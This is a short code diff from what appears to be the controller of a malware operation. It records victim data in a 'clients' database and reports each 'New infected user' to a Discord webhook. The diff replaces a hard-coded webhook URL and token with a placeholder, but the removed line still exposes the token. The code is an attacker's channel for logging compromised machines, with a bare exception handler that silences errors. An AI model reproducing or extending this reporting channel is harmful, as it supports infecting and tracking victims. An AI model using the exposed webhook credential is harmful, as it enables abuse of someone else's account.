@@ -30,8 +30,6 @@ while True:
             c.execute('''INSERT INTO clients VALUES (Null,?,?,?)''', data)
             connexion.commit()
             connexion.close()
-            webhook = DiscordWebhook(
-                url='https://discordapp.com/api/webhooks/901109448477642863/WUgz5CXsyDrmEKwr2ODUtseQZeSXwEH_6OiDphbaULA8xjygMh6zI53To3acwM7leJuS',
-                content=f"New infected user: {data}").execute()
+            webhook = DiscordWebhook(url='Discord Webhook URL',content=f"New infected user: {data}").execute()
     except:
         pass
